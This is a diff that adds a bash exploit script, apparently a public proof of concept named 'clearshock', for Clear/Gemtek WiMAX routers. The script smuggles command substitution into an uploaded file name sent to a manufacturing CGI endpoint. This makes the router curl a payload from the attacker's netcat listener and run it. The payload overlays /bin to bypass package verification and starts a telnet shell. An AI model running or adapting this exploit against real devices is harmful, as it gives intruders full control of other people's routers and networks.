@@ -1,0 +1,20 @@
+#!/bin/bash
+# clearshock - pwn Clear/Simplexity/Gemtek WIXFBR-131/GTK-RSU131, WIXFBR-117, and possibly more WiMAX routers
+# 3/10/15 chris_commat_misentropic_commercial
+# uses GNU netcat. deal with it.
+
+# ethernet, wifi... heck, it even works via remote admin (if enabled!)
+HOST=192.168.15.2
+CPE=192.168.15.1
+
+# ipkg verification happens via a script in /bin (ro)
+# lets overlay a new copy of /bin and allow successful installation of any arbit. ipkg >:3
+IPKGPWN="if [ ! -d /tmp/bin ]; then mkdir /tmp/bin ; cp -rf /bin/* /tmp/bin/ ; printf \"#!/bin/sh\nprintf 1 > /tmp/ipkg.chk\n\" > /tmp/bin/ipkg_verify.sh ; mount -o bind /tmp/bin /bin ; else echo nope ; fi"
+TELNETD="/usr/sbin/telnetd -p 23"
+PAYLOAD=\$\(\ cd\ ..\;cd\ ..\;cd\ tmp\;curl\ -o\ pwn\ ${HOST}:5150\;sh\ pwn\ \)
+
+touch "${PAYLOAD}"
+echo "${IPKGPWN} ; ${TELNETD}" | nc -q0 -l 5150 2>&1 > /dev/null &
+curl -X POST -H 'Expect:' -H 'Connection: close' -F "file=@\"$PAYLOAD\"" "http://$CPE/cgi-bin/sysconf.cgi?page=mfg&action=12"
+rm -f "${PAYLOAD}"
+
